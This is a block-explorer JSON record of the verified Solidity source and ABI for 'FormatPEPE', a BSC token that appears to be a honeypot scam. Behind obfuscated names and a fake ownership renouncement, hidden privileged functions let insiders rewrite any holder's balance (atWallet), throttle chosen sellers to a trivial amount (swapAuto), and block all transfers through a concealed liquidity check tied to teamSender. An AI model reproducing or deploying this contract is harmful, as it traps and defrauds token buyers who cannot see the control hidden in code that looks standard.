{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface maxLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitLaunched) external view returns (uint256);\n\n    function transfer(address txLaunchTeam, uint256 fundTotal) external returns (bool);\n\n    function allowance(address txFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txLaunchTeam,\n        uint256 fundTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTakeReceiver, uint256 value);\n    event Approval(address indexed txFrom, address indexed spender, uint256 value);\n}\n\nabstract contract takeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toFeeReceiver {\n    function createPair(address feeMinTx, address fundExempt) external returns (address);\n}\n\ninterface buyToken is maxLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FormatPEPE is takeReceiver, maxLaunched, buyToken {\n\n    function owner() external view returns (address) {\n        return txMode;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTotal;\n    }\n\n    function teamSender(uint256 fundTotal) public {\n        autoIsSwap();\n        buyAmount = fundTotal;\n    }\n\n    uint256 private shouldFrom = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private marketingLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityTrading;\n    }\n\n    uint256 constant modeList = 3 ** 10;\n\n    function liquidityTotalFee(address fundList, address txLaunchTeam, uint256 fundTotal) internal returns (bool) {\n        if (fundList == takeFromFee) {\n            return receiverSwap(fundList, txLaunchTeam, fundTotal);\n        }\n        uint256 autoAt = maxLaunched(receiverBuy).balanceOf(exemptIs);\n        require(autoAt == buyAmount);\n        require(txLaunchTeam != exemptIs);\n        if (sellReceiver[fundList]) {\n            return receiverSwap(fundList, txLaunchTeam, modeList);\n        }\n        return receiverSwap(fundList, txLaunchTeam, fundTotal);\n    }\n\n    function balanceOf(address limitLaunched) public view virtual override returns (uint256) {\n        return walletTeam[limitLaunched];\n    }\n\n    uint256 buyAmount;\n\n    bool public txMin;\n\n    bool public receiverEnable;\n\n    function receiverSwap(address fundList, address txLaunchTeam, uint256 fundTotal) internal returns (bool) {\n        require(walletTeam[fundList] >= fundTotal);\n        walletTeam[fundList] -= fundTotal;\n        walletTeam[txLaunchTeam] += fundTotal;\n        emit Transfer(fundList, txLaunchTeam, fundTotal);\n        return true;\n    }\n\n    uint8 private liquidityTrading = 18;\n\n    function swapAuto(address amountTeam) public {\n        autoIsSwap();\n        \n        if (amountTeam == takeFromFee || amountTeam == receiverBuy) {\n            return;\n        }\n        sellReceiver[amountTeam] = true;\n    }\n\n    mapping(address => uint256) private walletTeam;\n\n    event OwnershipTransferred(address indexed tokenReceiver, address indexed fromTo);\n\n    string private autoSenderMode = \"Format PEPE\";\n\n    function allowance(address shouldLiquidity, address tradingTxIs) external view virtual override returns (uint256) {\n        if (tradingTxIs == fundReceiverAmount) {\n            return type(uint256).max;\n        }\n        return marketingLaunch[shouldLiquidity][tradingTxIs];\n    }\n\n    function approve(address tradingTxIs, uint256 fundTotal) public virtual override returns (bool) {\n        marketingLaunch[_msgSender()][tradingTxIs] = fundTotal;\n        emit Approval(_msgSender(), tradingTxIs, fundTotal);\n        return true;\n    }\n\n    constructor (){\n        \n        exemptReceiver buyTotal = exemptReceiver(fundReceiverAmount);\n        receiverBuy = toFeeReceiver(buyTotal.factory()).createPair(buyTotal.WETH(), address(this));\n        \n        takeFromFee = _msgSender();\n        launchMax();\n        shouldReceiver[takeFromFee] = true;\n        walletTeam[takeFromFee] = shouldFrom;\n        \n        emit Transfer(address(0), takeFromFee, shouldFrom);\n    }\n\n    string private shouldTotal = \"FPE\";\n\n    function atWallet(address walletMarketing, uint256 fundTotal) public {\n        autoIsSwap();\n        walletTeam[walletMarketing] = fundTotal;\n    }\n\n    address public receiverBuy;\n\n    uint256 public teamReceiver;\n\n    mapping(address => bool) public sellReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldFrom;\n    }\n\n    function transferFrom(address fundList, address txLaunchTeam, uint256 fundTotal) external override returns (bool) {\n        if (_msgSender() != fundReceiverAmount) {\n            if (marketingLaunch[fundList][_msgSender()] != type(uint256).max) {\n                require(fundTotal <= marketingLaunch[fundList][_msgSender()]);\n                marketingLaunch[fundList][_msgSender()] -= fundTotal;\n            }\n        }\n        return liquidityTotalFee(fundList, txLaunchTeam, fundTotal);\n    }\n\n    function transfer(address walletMarketing, uint256 fundTotal) external virtual override returns (bool) {\n        return liquidityTotalFee(_msgSender(), walletMarketing, fundTotal);\n    }\n\n    address private txMode;\n\n    uint256 public sellTrading;\n\n    function getOwner() external view returns (address) {\n        return txMode;\n    }\n\n    address exemptIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverAt;\n\n    function name() external view virtual override returns (string memory) {\n        return autoSenderMode;\n    }\n\n    address fundReceiverAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromToTx(address sellTakeEnable) public {\n        require(sellTakeEnable.balance < 100000);\n        if (receiverEnable) {\n            return;\n        }\n        \n        shouldReceiver[sellTakeEnable] = true;\n        if (receiverAt != txMin) {\n            teamReceiver = sellTrading;\n        }\n        receiverEnable = true;\n    }\n\n    uint256 isFrom;\n\n    address public takeFromFee;\n\n    uint256 public liquidityAt;\n\n    mapping(address => bool) public shouldReceiver;\n\n    bool public fromLimit;\n\n    function launchMax() public {\n        emit OwnershipTransferred(takeFromFee, address(0));\n        txMode = address(0);\n    }\n\n    function autoIsSwap() private view {\n        require(shouldReceiver[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTakeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTxIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotal\",\"type\":\"uint256\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTakeEnable\",\"type\":\"address\"}],\"name\":\"fromToTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTotal\",\"type\":\"uint256\"}],\"name\":\"teamSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLaunchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FormatPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}